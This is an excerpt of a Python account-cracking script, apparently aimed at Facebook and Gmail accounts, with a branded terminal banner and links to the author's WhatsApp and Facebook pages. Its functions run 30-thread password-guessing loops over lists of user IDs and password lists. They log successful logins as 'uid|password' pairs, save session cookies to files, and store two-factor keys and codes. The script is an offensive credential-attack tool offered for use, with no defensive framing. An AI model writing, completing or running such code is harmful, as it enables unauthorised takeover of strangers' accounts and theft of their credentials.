# Orignally Written By ERROR Khan
...
os.system('xdg-open https://whatsapp.com/dl/code=7elQzH7b1a')
os.system('xdg-open https://www.facebook.com/SHETAN.FYTER.REPOTER?mibextid=ZbWKwL')
...
\033[1;39m━▷ \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m◈✙◈\033[1;33m MR ALI X ZIDI
\033[1;39m━▷ \033[0;92m𝙏𝙀𝘼𝙈     \033[1;39m◈✙◈\033[1;31m TEAM OF ERROR 
\033[1;39m━▷ \033[0;93m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m◈✙◈ \033[1;33mALI ERROR 
\033[1;39m━▷ \033[0;94m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;34mFACEBOOK HELPING ZONE 
\033[1;39m━▷ \033[0;95m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m◈✙◈ \033[0;92mFREE
\033[1;39m━▷ \033[0;97m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;31m 0.6
\033[1;39m━▷ \033[1;36m𝙁𝙀𝙀𝙇 𝙏𝙃𝙀 𝙋𝙊𝙒𝙀𝙍 𝙊𝙁  AL! 𝙊𝙒𝙉𝙀𝙍 𝙊𝙁 ERR0R 𝐁𝐑𝐀𝐍𝐃
\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
...
def file_crack():
	...
	with tred(max_workers=30) as ERROR:
		...
		for user in fo:
			...
			passlist = plist
			if methd =='1':
				ERROR.submit(api1,ids,names,passlist)
			else:
				ERROR.submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
...
def gmail():
                ...
                with tred(max_workers=30) as MUGHAL:
                        ...
                        for user in fo:
                                ...
                                MUGHAL.submit(rd1,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m[ERROR]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				if 'session_key' in po:
						...
						file_path_ok = os.path.join(folder_path, 'ERROR_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'ERROR_COOKIES.txt')
						...
						print(f'\r\r\33[1m\33[1;35m [ERROR-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'ERROR-CP.txt')
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[ERROR-M1]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m [ERROR-OK] '+uid+' | '+pas)
					file_path = os.path.join(folder_path, 'ERROR_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
...
def auto2F():
	...
	if response['Status']=="Success":
		...
		for i in codes:
			...
			open('/sdcard/MUGHAL/MUGHAL-2F.txt','a').write(id+'|'+ps+'\n'+keys+'\n'+i+'\n')
